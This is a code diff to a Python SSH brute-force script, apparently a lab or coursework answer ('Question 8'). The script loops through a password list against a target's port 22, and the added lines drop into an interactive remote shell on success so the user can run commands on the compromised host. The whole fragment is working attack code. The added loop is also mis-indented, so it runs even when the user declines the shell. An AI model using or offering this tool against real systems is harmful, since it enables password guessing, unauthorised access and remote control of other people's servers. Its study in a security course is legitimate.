@@ -269,14 +269,35 @@ def bruteforceSSH(target_ip, username, password_list):
     client.set_missing_host_key_policy(AutoAddPolicy()) 
     
     for password in passwords:
-        try:
-            print(f"[+] Trying password: {password}")
-            
+        try:           
             # Connect to the SSH server
             client.connect(target_ip, port=22, username=username, password=password, timeout=10) # Timeout high to avoid error
             
             # Authentication success
             print(f"[+] Success! Username: {username}, Password: {password}")
+
+            # Question 8 : Set-up Shell
+
+            user_input = input(f"[?] Drop to a shell on target {target_ip}? (y/n): ").strip().lower()
+            
+            if user_input == "y":
+                print("[+] Entering interactive shell. Type 'exit' to quit.")
+                shell = client.invoke_shell() # Calls the SSH shell
+
+            while True:
+                    command = input("$ ")  # Prompt for inputs
+                    if command.strip().lower() == "exit":
+                        print("[+] Exiting shell...")
+                        break
+                    else:
+                        # Execute command and print the output
+                        shell.send(command + "\n")
+                        time.sleep(1)  
+
+                        if shell.recv_ready(): # Check if data has been sent from SSH server
+                            output = shell.recv(4096).decode('utf-8', errors='ignore') # Outputs this data
+                            print(output)
+
             return 
         
         except AuthenticationException:
